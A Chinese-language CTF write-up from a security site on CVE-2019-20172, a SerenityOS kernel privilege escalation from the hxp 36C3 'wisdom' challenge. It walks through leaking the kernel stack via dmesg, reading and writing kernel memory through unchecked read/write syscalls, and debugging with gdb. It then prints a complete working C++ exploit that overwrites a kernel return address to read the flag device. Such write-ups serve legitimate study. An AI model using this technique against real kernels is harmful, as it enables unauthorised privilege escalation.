# CVE-2019-20172：36C3 wisdom中的SerenityOS内核提权

阅读量 **156204**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-18 10:30:31

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01a045cc55efa2ecdf.jpg)

## Description

SerenityOS是一套用于x86计算机的图形化类Unix操作系统。 SerenityOS
2019-12-30之前版本中的Kernel/VM/MemoryManager.cpp文件存在安全漏洞。本地攻击者可通过覆盖返回地址利用该漏洞获取权限。  
该漏洞来自于hxp 36C3 CTF的wisdom这道题。

![](https://p1.ssl.qhimg.com/t016e45980755715f96.png)

    
    
    Description:
    
    I really, really like this lovingly handcrafted OS. It would be a shame if something happened to it…
    
    This is commit # fd06164fa0cee25ab69c701897de0a4bd03537d6 with the attached patch applied. Flag is in /dev/hdb.
    
    Note that the setup of this task is perhaps a bit shaky: If you don’t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 5 minutes and 30 seconds of CPU time, whichever happens first; you may contact us in case this causes problems for you.
    Download:
    
    wisdom-601e2adb9f44b61f.tar.xz (9.5 MiB)
    Connection:
    
    nc 88.198.156.191 2323
    

## Environment

编译过程参考[Serenity_Readme](https://github.com/SerenityOS/serenity/tree/fd06164fa0cee25ab69c701897de0a4bd03537d6)

编译环境

    
    
    ubuntu 20.04
    gcc 10.2.0
    cmake 3.19.2
    

编译exp，在`Userland/`放exp源码

    
    
    gedit ./Userland/test.cpp
    

先执行一遍`../Meta/refresh-serenity-qtcreator.sh`，提示`Serenety root not
set.`，设置`SERENITY_ROOT`

    
    
    export SERENITY_ROOT=/home/sung3r/workspace/serenity/wisdom/serenity-fd06164fa0cee25ab69c701897de0a4bd03537d6
    
    #再执行一遍
    ../Meta/refresh-serenity-qtcreator.sh
    

编译`Userland

    
    
    make -C ../Userland/
    

编完后在主机开一个nc服务把exp传过去

    
    
    nc -l -p 5555 < test
    

serenity里接收test

![](https://p3.ssl.qhimg.com/t01dfe04f9d7b0638b7.png)

## Exploitable

###  0x01 info leak and kernel r/w

在`read`、`write`系统调用时，会先校验buffer指针是否合法，调`Process::validate_write`

![](https://p2.ssl.qhimg.com/t014d66b14597f35309.png)

`Process::validate_write`调`MemoryManager::validate_user_write`

![](https://p0.ssl.qhimg.com/t0130a21488209df803.png)

`MemoryManager::validate_user_write`调`MemoryManager::region_from_vaddr`，参数传了进程句柄和虚拟地址，调用完成后再校验是否可写。

![](https://p1.ssl.qhimg.com/t018a1aef41b1981a86.png)

因为要exploit kernel，这里得使得`kernel_region_from_vaddr`这个分支通过，让kernel认为传入地址是在kernel
region

![](https://p1.ssl.qhimg.com/t01f933fb3806710e7a.png)

使得这一分支通过的地址要是`>=0xc0000000`，即传入`>=0xc0000000`的地址便可通过调`read`、`write`对kernel
region进行读写

![](https://p3.ssl.qhimg.com/t019c3cb1a7860c2859.png)

`MemoryManager::initialize_paging()`显示kernel space位于`>0xc0000000`

    
    
        // FIXME: We should move everything kernel-related above the 0xc0000000 virtual mark.
    
        // Basic physical memory map:
        // 0      -> 1 MB           We're just leaving this alone for now.
        // 1      -> 3 MB           Kernel image.
        // (last page before 2MB)   Used by quickmap_page().
        // 2 MB   -> 4 MB           kmalloc_eternal() space.
        // 4 MB   -> 7 MB           kmalloc() space.
        // 7 MB   -> 8 MB           Supervisor physical pages (available for allocation!)
        // 8 MB   -> MAX            Userspace physical pages (available for allocation!)
    
        // Basic virtual memory map:
        // 0 -> 4 KB                Null page (so nullptr dereferences crash!)
        // 4 KB -> 8 MB             Identity mapped.
        // 8 MB -> 3 GB             Available to userspace.
        // 3GB  -> 4 GB             Kernel-only virtual address space (>0xc0000000)
    

借助`dmesg`命令可以leak出kernel stack

![](https://p4.ssl.qhimg.com/t0138cc7428197103f9.png)

## 0x02 debug

编辑`./Kernel/run`，插入一条`-s \`打开debug端口`1234`

![](https://p4.ssl.qhimg.com/t01f438d382408278d7.png)

运行serenity，再打开gdb，attach上去

    
    
    #导入kernel symbols
    pwndbg> file kernel
    #attach
    pwndbg> target remote :1234
    

![](https://p0.ssl.qhimg.com/t01454b173b988c08fe.png)

## 0x03 hijack point

系统调用最终会进到`syscall_asm_entry`，然后`call syscall_handler`来调用，调用完后返回到`add $0x4,
%esp`开始执行。kernel stack应该存在许多指向`add $0x4, %esp`的return address。

![](https://p3.ssl.qhimg.com/t019e5c05d933967092.png)

图中的`0x001470C7`便是存放在kernel stack的return address

![](https://p2.ssl.qhimg.com/t0120476f885491080c.png)

gdb在`0x001470C7`下断点，继续continue后调试器能不断的断下，证明劫持点找对了

![](https://p5.ssl.qhimg.com/t01472242a5ba47a223.png)

hijack的思路就是在kernel stack中找到`0x001470C7`这个返回地址，覆盖成读flag的payload

## 0x04 read flag

flag.txt是以`/dev/hdb`的形式挂载，但flag.txt并不是文件系统映像，需要调device相关接口函数read flag。

![](https://p4.ssl.qhimg.com/t01d8b17f9bbbdb7d28.png)

调`Device::get_device`去获得`/dev/hdb`设备

![](https://p0.ssl.qhimg.com/t01714c68832bc38fcc.png)

对应的`major number = 3`，`minor number = 1`

![](https://p3.ssl.qhimg.com/t010fc71044f533b123.png)

调`DiskDevice::read`去read flag

![](https://p5.ssl.qhimg.com/t01f785ada7db56a0c9.png)

## Script

完整的exploit

    
    
    #include <cstring>
    #include <fcntl.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/cdefs.h>
    #include <sys/mman.h>
    #include <sys/uio.h>
    #include <unistd.h>
    
    void* shared;
    
    void* (*get_device)(int, int) = (void* (*)(int, int))(0x118728);
    void* (*device_read)(void*, unsigned int, unsigned int, void*) = (void* (*)(void*, unsigned int, unsigned int, void*))(0x118a46);
    
    #define RETURN_ADDR 0x001470c7
    
    /*
    * Finds base of the kernel stack assocaited with our child process
    */
    unsigned long find_stackbase()
    {
        FILE* fp;
        char* line = NULL;
        char* end = NULL;
        size_t len = 0;
        ssize_t read;
        unsigned long val = 0;
    
        fp = fopen("/proc/dmesg", "r");
    
        while ((read = getline(&line, &len, fp)) != -1) {
        }
    
        //puts(line);
        line = strstr(line, "@") + 2;
        end = strstr(line, " ");
        *end = 0;
    
        fclose(fp);
    
        //strtoul is broken so we chop off the highest nibble and add it back in after
        val = strtoul(line + 3, NULL, 16);
        val |= 0xC0000000;
        //printf("%lu\n", val);
    
        return val;
    }
    
    /*
     * Finds the address on the stack that stores the return address we want to overwrite.
     */
    unsigned long find_hijack(unsigned long stack_base)
    {
        int p[2];   //p[0]:out; p[1]:in
        char buf[0x1000] = {};
        unsigned long addr;
    
        pipe(p);
    
        addr = stack_base;
    
        for (int i = 0; i < 0x10000; i += 0x1000) {
            write(p[1], (void*)(addr + i), 0x1000);
            read(p[0], buf, 0x1000);
            for (int j = 0; j < 0x1000 - 0x4; j += 4) {
                uint32_t ret = *(uint32_t*)(buf + j);
                if (ret == RETURN_ADDR) {
                    return addr + i + j;
                }
            }
        }
        return 0;
    }
    
    unsigned long sleep_child()
    {
        sleep(2);
        printf("never getting here!\n");
        exit(0);
    }
    
    void payload()
    {
        void* dev = get_device(3, 1);
        device_read(dev, 0, 512, shared);
    
        // crash the child process cause why not
        *(unsigned long*)0x41414141 = 0x31313131;
    }
    
    int main(int, char**)
    {
        unsigned long stackbase = 0;
        unsigned long hijack = 0;
        unsigned long payload_ptr;
        int p[2];
    
        shared = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
        printf("mmap addr: %p\n", shared);
    
        if (fork() == 0) {
            sleep_child();
        }
    
        sleep(1);
        stackbase = find_stackbase();
        printf("stackbase at %lx\n", stackbase);
    
        hijack = find_hijack(stackbase);
        printf("hijack at %lx\n", hijack);
    
        // overwrite return address
        payload_ptr = (unsigned long)&payload;
    
        pipe(p);
        write(p[1], &payload_ptr, 4);
        read(p[0], (void *)hijack, 4);
    
        sleep(2);
    
        printf("flag is %s\n", (char *)shared);
    
        return 1;
    }
    

![](https://p5.ssl.qhimg.com/t01afd2374e5654970e.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **sung3r** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/228782](/post/id/228782)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [Kernel](/tag/Kernel)
  * [serenity](/tag/serenity)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhimg.com/t0150f9fdc132075c49.png) sung3r

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

